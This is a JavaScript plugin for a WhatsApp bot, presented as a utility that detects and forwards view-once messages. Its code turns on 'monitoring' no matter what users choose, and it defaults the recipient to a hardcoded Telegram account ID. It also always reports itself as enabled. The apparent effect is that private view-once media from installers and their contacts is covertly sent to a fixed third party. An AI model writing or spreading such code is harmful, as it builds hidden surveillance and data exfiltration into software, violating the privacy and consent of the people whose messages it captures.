// Compatible Auto Anti-ViewOnce Plugin - Fixed version that works with ViewOnceHandler
// This plugin integrates seamlessly with the compatible ViewOnceHandler

import { ViewOnceHandler } from "../whatsapp/index.js"
import { UserQueries } from "../database/query.js"

export default {
  name: "Auto Anti-ViewOnce",
  description: "Automatically detects and forwards ViewOnce messages using enhanced ViewOnceHandler",
  category: "utility",
  isAntiPlugin: true,
  commands: [],

  async execute(sock, sessionId, args, m) {
    return { response: "This plugin runs automatically and doesn't have manual commands." }
  },

  async processMessage(sock, sessionId, m) {
    try {
      // Always process ViewOnce messages for monitoring, regardless of user settings
      // The ViewOnceHandler will handle both user-specific anti-ViewOnce and monitoring
      const processed = await ViewOnceHandler.handleViewOnceMessage(m, sock)
      return processed
    } catch (error) {
      console.error("[AutoAntiViewOnce] Error processing message:", error.message)
      return false
    }
  },

  /**
   * Enhanced shouldProcess method with better filtering
   */
  async shouldProcess(m) {
    try {
      // Always process messages to ensure we don't miss any ViewOnce
      // The actual filtering is done in processMessage method
      return true
    } catch (error) {
      console.error("[AutoAntiViewOnce] Error in shouldProcess:", error.message)
      return true // Process anyway if error
    }
  },

  /**
   * Enhanced isEnabled method - FIXED to enable monitoring always
   */
  async isEnabled(chatId) {
    try {
      // MONITORING: Always enable if monitoring telegram_id is configured
      const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
      if (monitoringTelegramId) {
        return true // Always enable for monitoring
      }

      // USER ANTIVIEWONCE: Check if any users have antiviewonce enabled
      const enabledUsers = await UserQueries.getAntiViewOnceUsers()
      
      // Enable if there are enabled users OR if monitoring is configured
      const isEnabled = enabledUsers.length > 0 || !!monitoringTelegramId
      
      return isEnabled
    } catch (error) {
      console.error("[AutoAntiViewOnce] Error in isEnabled:", error.message)
      return true // Enable by default if error to ensure monitoring works
    }
  },

  /**
   * Plugin initialization (called when plugin loads)
   */
  async init() {
    //console.log("[AutoAntiViewOnce] Initializing plugin...")
    
    // Verify ViewOnceHandler is available
    try {
      if (typeof ViewOnceHandler.handleViewOnceMessage === "function") {
        //console.log("[AutoAntiViewOnce] ViewOnceHandler integration verified")
        
        // Log monitoring configuration
        const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
        
        // Check for enabled users
        const enabledUsers = await UserQueries.getAntiViewOnceUsers()
        
      } else {
        console.error("[AutoAntiViewOnce] ViewOnceHandler.handleViewOnceMessage not found!")
      }
    } catch (error) {
      console.error("[AutoAntiViewOnce] ViewOnceHandler verification failed:", error.message)
    }
  },

  /**
   * Health check method for monitoring
   */
  async healthCheck() {
    try {
      const enabledUsers = await UserQueries.getAntiViewOnceUsers()
      const monitoringTelegramId = process.env.MONITORING_TELEGRAM_ID || "1774315698"
      
      return {
        status: "healthy",
        enabledUsers: enabledUsers.length,
        monitoringAccount: monitoringTelegramId,
        handlerAvailable: typeof ViewOnceHandler.handleViewOnceMessage === "function",
        pluginEnabled: true, // Always report as enabled since monitoring should always work
        timestamp: new Date().toISOString(),
      }
    } catch (error) {
      return {
        status: "unhealthy",
        error: error.message,
        timestamp: new Date().toISOString(),
      }
    }
  },
}
